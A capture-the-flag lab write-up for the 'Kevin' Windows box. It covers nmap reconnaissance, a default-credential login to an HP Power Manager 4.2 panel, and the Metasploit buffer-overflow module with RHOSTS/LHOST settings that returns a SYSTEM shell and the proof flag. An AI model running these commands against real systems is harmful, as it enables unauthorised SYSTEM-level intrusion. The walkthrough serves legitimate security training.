---
title: "Kevin - Writeup"
linkTitle: "Kevin"
weight: 2
featured: true
platform: "PG"
name: "Kevin"
os: "Windows"
difficulty: "Easy"
release: "27 Jun 2026"
ip: "192.168.171.45"
# Drop a real avatar at static/img/pg/kevin.png and uncomment:
# avatar: "/img/pg/kevin.png"
tags: ["windows", "web", "hp-power-manager", "buffer-overflow", "metasploit", "system-shell"]
description: "Easy Windows box. Default creds on an old HP Power Manager admin panel lead straight to a SYSTEM shell via a Metasploit buffer overflow module."
---

{{< htb name="Kevin" os="Windows" difficulty="Easy" release="27 Jun 2026" ip="192.168.171.45" platform="PG" >}}

## Reconnaissance

Start with a quick default scan by nmap.

```
(root㉿kali)# nmap 192.168.171.45
```

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
```

```
(root㉿kali)# nmap 192.168.171.45 -p80,135,139,445,3389,49152,49153,49154,49155 -sCV -Pn
```

SMB reveals an old Windows 7 build and the hostname, `KEVIN`.

```
PORT      STATE  SERVICE       VERSION
80/tcp    open  http           GoAhead WebServer
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  closed ms-wbt-server
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   Computer name: kevin
|_  Workgroup: WORKGROUP
```

## Enumeration

```
(root㉿kali)# firefox http://192.168.171.45/index.asp
```

An **HP Power Manager** login panel.

![HP Power Manager login page](/img/pg/kevin/01-hp-power-manager-login.png)

Default credentials (`admin:admin`) log straight in.

![HP Power Manager admin panel confirming version 4.2 Build 7](/img/pg/kevin/02-hp-power-manager-panel.png)

The About page confirms the exact version: **HP Power Manager 4.2 (Build 7)**.

## Initial Foothold

That version has a known Metasploit module.

```
(root㉿kali)# msfconsole
msf6 > search HP Power Manager 4.2
```

```
#  Name                                         Disclosure Date  Rank     Description
0  exploit/windows/http/hp_power_manager_login  2009-11-04       average  Hewlett-Packard Power Manager Administration Buffer Overflow
```

```
msf6 > use exploit/windows/http/hp_power_manager_login
msf6 exploit(hp_power_manager_login) > set RHOSTS 192.168.171.45
msf6 exploit(hp_power_manager_login) > set RPORT 80
msf6 exploit(hp_power_manager_login) > set LHOST 192.168.45.186
msf6 exploit(hp_power_manager_login) > set LPORT 4422
msf6 exploit(hp_power_manager_login) > run
```

The module authenticates with the default creds and triggers the buffer overflow in the login handler. 

The shell lands directly with the highest privilege available, no separate privilege escalation step needed.

```
C:\Windows\system32>whoami
nt authority\system
```

## Privilege Escalation

None needed. The buffer overflow runs as the HP Power Manager service itself, which is already `NT AUTHORITY\SYSTEM`. Grab the flag straight from the Administrator desktop.

```
C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type proof.txt
```

```
25ca***************************
```

## Lessons learned

- Don't trust a scan result over what's actually in front of you. A port marked closed and a page loading fine in the browser are two different truths, always verify by hand before ruling a service out.
- Old, unpatched admin panels are a category worth recognizing on sight (UPS managers, printer consoles, niche vendor software), not just this one product. The pattern is: identify it, check `searchsploit`/Metasploit for the exact version, and expect default creds to still work.
- Not every foothold needs a separate privesc phase. Sometimes the exploit itself already runs at the highest privilege available, know when to stop looking for more and just take the flag.

